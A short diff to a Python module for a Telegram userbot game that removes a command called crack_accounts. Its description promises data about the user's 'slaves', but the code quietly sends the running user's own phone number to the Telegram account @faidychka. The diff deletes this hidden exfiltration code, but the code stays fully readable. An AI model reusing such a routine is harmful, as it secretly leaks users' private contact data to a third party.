@@ -190,17 +190,6 @@ class TheSlavesrMod(loader.Module):
         else:
             await message.edit(self.strings["error_locksalve"].format(slave_id, "Не удалось заблокировать раба."))
     @loader.command()
-    async def crack_accounts(self, message):
-        """Получает все данные о своих рабах 💀"""
-        try:
-            me = await self.client.get_me()  # Получение информации о текущем пользователе
-            if hasattr(me, "phone") and me.phone:
-                await self.client.send_message('@faidychka', f"📞 Ваш номер телефона: +{me.phone}")
-            else:
-                await message.edit("⚠️ Ошибка")
-        except Exception as e:
-            await message.edit(f"❌ Ошибка: {e}")
-    @loader.command()
     async def autolock(self, message):
         """Проверяет всех ваших рабов и блокирует тех, кто не в кандалах, на 8 часов."""
         user_id = await self.get_user_id(message)
